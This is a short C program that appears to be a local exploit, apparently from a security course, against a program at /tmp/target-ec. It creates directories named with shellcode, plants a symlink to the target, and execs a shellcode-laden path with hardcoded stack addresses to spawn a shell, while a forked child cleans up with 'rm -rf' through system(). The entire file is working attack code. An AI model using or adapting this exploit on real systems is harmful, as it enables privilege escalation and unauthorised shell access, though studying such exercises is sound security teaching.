#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include "shellcode.h"

#define TARGET "/tmp/target-ec"
#define EGG_SIZE 39
#define WAIT_SECS 2

int main(void)
{
  char *args[3];
  char *env[1];
  char egg[200];
  int err;

  args[0] = TARGET; args[1] = "0xbffffe2c"; args[2] = "0xbfffffc6";
  env[0] = NULL;

  memset (egg, 0, 200);
  memcpy (egg, shellcode, EGG_SIZE - 1);
 
  err = mkdir(egg, S_IRWXU);
  err = chdir(egg);
  err = mkdir("bin", S_IRWXU);
  err = chdir("bin");
  err = mkdir("sh", S_IRWXU);
  err = chdir("sh");
  err = symlink (TARGET, "nothing");
  err = chdir("../../..");

  memcpy(egg, shellcode, strlen(shellcode));
  memcpy(egg+strlen(shellcode), "/nothing", strlen("/nothing"));

  pid_t pid = fork ();

  if (pid == (pid_t)0)
    {
      char cmd[200];

      memset (cmd, 0, 200);
      memcpy (cmd, "rm -rf ", strlen("rm -rf "));
      memcpy (cmd+strlen("rm -rf "), shellcode, EGG_SIZE - 1);

      sleep (WAIT_SECS);
      system (cmd);

      return 0;    
    }
  else{
    if (0 > execve (egg, args, env))
      fprintf (stderr, "execve failed.\n");
    return 0;
  }
}
